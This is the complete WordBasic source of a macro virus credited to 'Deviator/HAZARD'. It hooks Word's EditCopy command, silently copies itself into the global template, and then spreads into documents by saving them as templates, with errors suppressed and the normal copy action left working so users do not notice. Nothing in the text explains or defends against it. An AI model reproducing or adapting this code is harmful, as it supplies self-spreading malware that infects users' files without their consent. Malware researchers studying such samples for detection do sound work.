' Macro EditCopy

Sub MAIN
Rem Word.EditCopy by Deviator/HAZARD
On Error Goto GoForward
Here = 0
OurName$  = FileName$()
OurMacr$  = OurName$ + ":EditCopy"
N = CountMacros(0, 0)
For i = 1 To N
 If MacroName$(i, 0, 0) = "EditCopy" Then Here = 1
Next i
If Here = 0 Then MacroCopy  OurMacr$, "EditCopy", - 1
If Here = 1 Then
 MacroCopy "EditCopy", OurMacr$, - 1
 FileSaveAs .Format = 1
End If
GoForward:
EditCopy
End Sub
